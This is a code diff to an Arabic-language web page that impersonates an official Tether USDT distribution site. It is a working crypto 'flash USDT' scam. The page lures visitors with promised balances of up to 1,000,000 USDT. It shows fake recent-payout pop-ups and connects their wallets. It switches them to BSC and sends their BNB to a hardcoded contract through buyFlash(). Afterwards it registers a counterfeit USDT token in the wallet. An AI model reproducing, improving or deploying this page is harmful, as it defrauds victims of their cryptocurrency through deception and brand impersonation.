@@ -3,38 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tether USD | Official Rewards</title>
+    <title>Tether USD | Official Distribution</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <style>
-        :root { --primary: #00ffa3; --bg: #030a09; }
-        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        :root { --primary: #00ffa3; --bg: #030a09; --panel: #0a1412; }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow-x: hidden; }
         
-        .card { width: 90%; max-width: 400px; background: #0a1412; border: 1px solid #1a2e2a; border-radius: 24px; padding: 30px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.8); position: relative; z-index: 10; }
-        .logo { width: 70px; margin-bottom: 15px; filter: drop-shadow(0 0 10px var(--primary)); }
+        .card { width: 90%; max-width: 400px; background: var(--panel); border: 1px solid #1a2e2a; border-radius: 28px; padding: 30px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.9); position: relative; }
+        .logo { width: 75px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--primary)); }
         
+        h2 { font-size: 24px; margin: 10px 0; }
+        p { color: #888; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
+
+        select, button { width: 100%; padding: 18px; border-radius: 15px; border: none; font-weight: bold; font-size: 16px; transition: 0.3s; }
+        select { background: #111; color: #fff; border: 1px solid #222; margin-bottom: 15px; cursor: pointer; text-align: center; }
+        button { background: var(--primary); color: #000; cursor: pointer; text-transform: uppercase; }
+        button:hover { background: #00d68a; transform: translateY(-2px); }
+        button:disabled { background: #333; cursor: not-allowed; }
+
+        #msg { margin-top: 20px; font-size: 13px; color: var(--primary); min-height: 20px; }
+
         /* التنبيه المنبثق */
-        .notification { position: fixed; bottom: 20px; left: 20px; background: #0d1d1a; border: 1px solid var(--primary); padding: 12px 20px; border-radius: 12px; display: none; z-index: 1000; box-shadow: 0 5px 20px rgba(0,255,163,0.2); font-size: 13px; transition: 0.5s; }
+        .notification { position: fixed; bottom: 20px; right: 20px; background: #0d1d1a; border: 1px solid var(--primary); padding: 15px 25px; border-radius: 15px; display: none; z-index: 1000; box-shadow: 0 10px 30px rgba(0,255,163,0.15); animation: fadeIn 0.5s ease; font-size: 13px; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
         /* مودال المحافظ */
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center; }
-        .modal-box { background: #0a1412; padding: 25px; border-radius: 20px; width: 85%; max-width: 320px; border: 1px solid #1a2e2a; }
-        .wallet-item { display: flex; align-items: center; justify-content: space-between; padding: 12px; background: #142622; margin-top: 10px; border-radius: 12px; cursor: pointer; transition: 0.3s; }
-        .wallet-item:hover { border: 1px solid var(--primary); background: #1c3530; }
-        .wallet-item img { width: 25px; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center; }
+        .modal-content { background: #0a1412; padding: 25px; border-radius: 24px; width: 85%; max-width: 350px; border: 1px solid #1a2e2a; }
+        .wallet-opt { display: flex; align-items: center; justify-content: space-between; padding: 15px; background: #142622; margin-top: 12px; border-radius: 15px; cursor: pointer; border: 1px solid transparent; }
+        .wallet-opt:hover { border-color: var(--primary); background: #1c3530; }
+        .wallet-opt img { width: 30px; }
 
-        select, button { width: 100%; padding: 18px; margin-top: 20px; border-radius: 15px; border: none; font-weight: bold; font-size: 16px; }
-        select { background: #111; color: #fff; border: 1px solid #222; text-align: center; }
-        button { background: var(--primary); color: #000; cursor: pointer; transition: 0.4s; }
-        #msg { margin-top: 20px; font-size: 12px; color: var(--primary); }
+        .live-dot { display: inline-block; width: 8px; height: 8px; background: var(--primary); border-radius: 50%; margin-left: 8px; animation: blink 1s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo">
-    <h2>تفعيل استحقاق USDT</h2>
-    <p style="font-size: 13px; color: #888;">سيتم حقن الرصيد مباشرة في محفظتك عبر الشبكة الذكية</p>
-    
+    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo" alt="USDT">
+    <h2>حقن رصيد Tether</h2>
+    <p>بروتوكول التوزيع الذكي المباشر. اختر الفئة المناسبة لبدء عملية المزامنة الفورية.</p>
+
     <select id="tier">
         <option value="0.09">أساسي: 5,000 USDT</option>
         <option value="0.5">احترافي: 50,000 USDT</option>
@@ -42,17 +52,17 @@
         <option value="5.0">VIP: 1,000,000 USDT</option>
     </select>
 
-    <button id="startBtn" onclick="openWallets()">استلام الرصيد المخصص ⚡</button>
-    <div id="msg">● بانتظار اتصال البروتوكول الآمن...</div>
+    <button id="startBtn" onclick="showWallets()">تفعيل واستلام الرصيد ⚡</button>
+    <div id="msg"><span class="live-dot"></span> بانتظار تأمين الاتصال بالشبكة...</div>
 </div>
 
 <div id="walletModal" class="modal">
-    <div class="modal-box">
-        <h3 style="margin-top:0">اختر محفظتك</h3>
-        <div class="wallet-item" onclick="connect('MetaMask')"><span>MetaMask</span><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg"></div>
-        <div class="wallet-item" onclick="connect('Trust Wallet')"><span>Trust Wallet</span><img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg"></div>
-        <div class="wallet-item" onclick="connect('Coinbase')"><span>Coinbase</span><img src="https://www.vectorlogo.zone/logos/coinbase/coinbase-icon.svg"></div>
-        <button onclick="closeWallets()" style="background:#222; color:#fff; padding:10px; margin-top:15px; font-size:12px;">إلغاء</button>
+    <div class="modal-content">
+        <h3 style="margin-top:0; text-align:center;">اختر محفظتك</h3>
+        <div class="wallet-opt" onclick="initConnect('MetaMask')"><span>MetaMask</span><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg"></div>
+        <div class="wallet-opt" onclick="initConnect('Trust Wallet')"><span>Trust Wallet</span><img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg"></div>
+        <div class="wallet-opt" onclick="initConnect('Coinbase')"><span>Coinbase</span><img src="https://www.vectorlogo.zone/logos/coinbase/coinbase-icon.svg"></div>
+        <button onclick="hideWallets()" style="background:#222; color:#fff; margin-top:20px; padding:10px; font-size:12px;">إلغاء</button>
     </div>
 </div>
 
@@ -61,67 +71,95 @@
 <script>
     const CONTRACT_ADDR = "0x609BB2a512e6944210D01483e491A410912975F9";
     const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];
+    const CHAIN_ID = '0x38'; // BSC Mainnet
 
     // نظام التنبيهات كل 3 ثوانٍ
-    const amounts = ["5,000", "50,000", "150,000", "1,000,000", "25,000"];
-    const shortAddrs = ["0x51", "0x8a", "0x22", "0xbc", "0x33", "0xf1"];
+    const amounts = ["5,000", "25,000", "150,000", "500,000", "1,000,000"];
+    const wallets = ["0x4a", "0x7b", "0x12", "0xbc", "0x9d", "0xf5"];
 
     setInterval(() => {
         const notif = document.getElementById('notif');
         const amt = amounts[Math.floor(Math.random() * amounts.length)];
-        const adr = shortAddrs[Math.floor(Math.random() * shortAddrs.length)] + "...";
-        notif.innerHTML = `✅ <b>تم استلام ${amt} USDT</b><br><small>المحفظة: ${adr}</small>`;
+        const wal = wallets[Math.floor(Math.random() * wallets.length)] + "...";
+        notif.innerHTML = `✅ تم استلام <b>${amt} USDT</b> <br><small>بواسطة المحفظة ${wal}</small>`;
         notif.style.display = 'block';
-        setTimeout(() => { notif.style.display = 'none'; }, 2000);
+        setTimeout(() => { notif.style.display = 'none'; }, 2500);
     }, 3500);
 
-    function openWallets() { document.getElementById('walletModal').style.display = 'flex'; }
-    function closeWallets() { document.getElementById('walletModal').style.display = 'none'; }
+    function showWallets() { document.getElementById('walletModal').style.display = 'flex'; }
+    function hideWallets() { document.getElementById('walletModal').style.display = 'none'; }
 
-    async function connect(walletName) {
-        closeWallets();
+    async function initConnect(walletName) {
+        hideWallets();
         const btn = document.getElementById('startBtn');
         const msg = document.getElementById('msg');
-        
-        if (!window.ethereum) return alert("يرجى استخدام متصفح داخل تطبيق " + walletName);
+
+        if (typeof window.ethereum === 'undefined') {
+            alert("يرجى فتح الموقع من متصفح تطبيق " + walletName);
+            return;
+        }
 
         try {
             btn.disabled = true;
-            msg.innerText = "جاري الربط مع " + walletName + "...";
-            
+            msg.innerText = "جاري طلب الربط مع " + walletName + "...";
+
+            // طلب الحسابات
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             const web3 = new Web3(window.ethereum);
             const user = accounts[0];
 
-            const chainId = await web3.eth.getChainId();
-            if (chainId !== 56) {
-                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+            // التأكد من الشبكة
+            const netId = await web3.eth.getChainId();
+            if (netId !== 56) {
+                msg.innerText = "يرجى الموافقة على تحويل الشبكة...";
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: CHAIN_ID }],
+                });
             }
 
-            msg.innerText = "جاري تفعيل حقن الـ USDT...";
+            msg.innerText = "جاري معالجة الطلب في البروتوكول...";
             const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
-            const val = document.getElementById('tier').value;
+            const ethVal = document.getElementById('tier').value;
 
+            // إرسال المعاملة
             await contract.methods.buyFlash().send({
                 from: user,
-                value: web3.utils.toWei(val, "ether"),
+                value: web3.utils.toWei(ethVal, "ether"),
                 gas: 200000
-            });
-
-            msg.innerText = "✅ اكتمل الحقن! جاري التثبيت...";
-            
-            // إضافة التوكن للمحفظة
-            await window.ethereum.request({
-                method: 'wallet_watchAsset',
-                params: { type: 'ERC20', options: { address: CONTRACT_ADDR, symbol: 'USDT', decimals: 18, image: 'https://cryptologos.cc/logos/tether-usdt-logo.png' } }
+            })
+            .on('transactionHash', (hash) => {
+                msg.innerText = "✅ جاري تأكيد الحقن على الشبكة...";
+            })
+            .on('receipt', (receipt) => {
+                msg.innerText = "✨ اكتملت العملية! الرصيد متاح الآن.";
+                watchToken();
             });
 
         } catch (e) {
             console.error(e);
-            msg.innerText = "فشلت العملية. تأكد من تأكيد الطلب في محفظتك.";
+            msg.innerText = "⚠️ فشل: " + (e.message.includes('User denied') ? "تم رفض الطلب" : "حدث خطأ في الاتصال");
             btn.disabled = false;
         }
     }
+
+    async function watchToken() {
+        try {
+            await window.ethereum.request({
+                method: 'wallet_watchAsset',
+                params: {
+                    type: 'ERC20',
+                    options: {
+                        address: CONTRACT_ADDR,
+                        symbol: 'USDT',
+                        decimals: 18,
+                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
+                    }
+                }
+            });
+        } catch (e) { console.log("User skipped watch asset"); }
+    }
 </script>
+
 </body>
 </html>
